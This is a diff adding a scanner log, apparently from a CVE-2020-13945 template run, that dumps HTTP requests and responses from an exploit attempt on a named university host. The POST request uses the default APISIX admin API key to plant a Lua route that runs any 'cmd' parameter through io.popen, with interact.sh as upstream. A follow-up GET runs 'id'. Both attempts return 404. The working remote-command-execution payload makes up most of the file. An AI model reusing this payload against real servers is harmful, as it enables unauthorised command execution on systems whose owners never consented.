@@ -1,0 +1,72 @@
+[CVE-2020-13945] Dumped HTTP request for https://lms.vet.unimelb.edu.au/apisix/admin/routes
+
+
+POST /apisix/admin/routes HTTP/1.1
+Host: lms.vet.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 406
+Content-Type: application/json
+X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
+Accept-Encoding: gzip
+
+{
+  "uri":"/30v0wAi7pB7LyuCZAPvt6PGGjFQ",
+  "script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
+  "upstream":{
+    "type":"roundrobin",
+    "nodes":{
+      "interact.sh:80":1
+    }
+  }
+}
+[CVE-2020-13945] Dumped HTTP response https://lms.vet.unimelb.edu.au/apisix/admin/routes
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 285
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:18:03 GMT
+Server: Apache/2.4.62 (Debian)
+Set-Cookie: BIGipServer~app_vetlive_prod~pool_vetlive_prod_live=2035554220.47873.0000; path=/; Httponly; Secure
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at lms.vet.unimelb.edu.au Port 443</address>
+</body></html>
+
+[CVE-2020-13945] Dumped HTTP request for https://lms.vet.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id
+
+
+GET /30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id HTTP/1.1
+Host: lms.vet.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Cookie: BIGipServer~app_vetlive_prod~pool_vetlive_prod_live=2035554220.47873.0000
+Accept-Encoding: gzip
+
+
+[CVE-2020-13945] Dumped HTTP response https://lms.vet.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 285
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:18:04 GMT
+Server: Apache/2.4.62 (Debian)
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at lms.vet.unimelb.edu.au Port 443</address>
+</body></html>
+
